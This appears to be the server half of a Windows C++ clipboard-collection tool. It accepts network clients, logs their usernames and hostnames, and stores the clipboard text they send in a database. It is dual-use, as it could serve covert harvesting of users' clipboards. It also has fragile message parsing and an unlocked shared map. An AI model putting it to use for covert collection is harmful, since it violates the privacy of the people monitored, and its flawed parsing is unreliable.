#include "common.h"
#include "database.h"
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <map>
#include <fcntl.h>
#include <io.h>

struct ClientConnection {
    SOCKET socket;
    ClientInfo info;
};

std::map<SOCKET, ClientInfo> clients;
std::mutex clientsMutex;
Database db;

void HandleClient(SOCKET clientSocket) {
    char buffer[sizeof(Message)];
    std::string currentMessage;
    bool isReceivingChunks = false;

    while (true) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(Message), 0);
        if (bytesReceived <= 0) {
            break;
        }

        Message* msg = (Message*)buffer;
        
        switch (msg->type) {
            case MessageType::INIT: {
                std::lock_guard<std::mutex> lock(clientsMutex);
                clients[clientSocket] = msg->clientInfo;
                std::cout << "New client connected: " << msg->clientInfo.username 
                         << " from " << msg->clientInfo.hostname << std::endl;
                break;
            }
            case MessageType::REGULAR: {
                if (isReceivingChunks) {
                    currentMessage += msg->data;
                } else {
                    std::cout << "\nFrom " << clients[clientSocket].username 
                             << " (" << clients[clientSocket].hostname << "):\n"
                             << msg->data << std::endl;
                    
                    // Save to database
                    try {
                        db.saveClipboardEvent(
                            clients[clientSocket].username,
                            clients[clientSocket].hostname,
                            "text",
                            msg->data
                        );
                    } catch (const std::exception& e) {
                        std::cerr << "Failed to save to database: " << e.what() << std::endl;
                    }
                }
                break;
            }
            case MessageType::REGULAR_CHUNK: {
                currentMessage += msg->data;
                isReceivingChunks = true;
                break;
            }
            case MessageType::REGULAR_END: {
                if (isReceivingChunks) {
                    std::cout << "\nFrom " << clients[clientSocket].username 
                             << " (" << clients[clientSocket].hostname << "):\n"
                             << currentMessage << std::endl;
                    
                    // Save to database
                    try {
                        db.saveClipboardEvent(
                            clients[clientSocket].username,
                            clients[clientSocket].hostname,
                            "text",
                            currentMessage
                        );
                    } catch (const std::exception& e) {
                        std::cerr << "Failed to save to database: " << e.what() << std::endl;
                    }
                    
                    currentMessage.clear();
                    isReceivingChunks = false;
                }
                break;
            }
        }
    }

    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        std::cout << "Client disconnected: " << clients[clientSocket].username 
                 << " from " << clients[clientSocket].hostname << std::endl;
        clients.erase(clientSocket);
    }
    closesocket(clientSocket);
}

int main() {
    // Set console to use UTF-8
    SetConsoleOutputCP(CP_UTF8);
    
    // Test UTF-8 output
    std::cout << "Testing UTF-8 output with Chinese characters:" << std::endl;
    std::cout << "你好世界 (Hello World)" << std::endl;
    std::cout << "中国 (China)" << std::endl;
    std::cout << "北京 (Beijing)" << std::endl;
    std::cout << "------------------------" << std::endl;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return 1;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to bind socket" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Failed to listen on socket" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Server started. Waiting for connections..." << std::endl;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Failed to accept connection" << std::endl;
            continue;
        }

        std::thread clientThread(HandleClient, clientSocket);
        clientThread.detach();
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}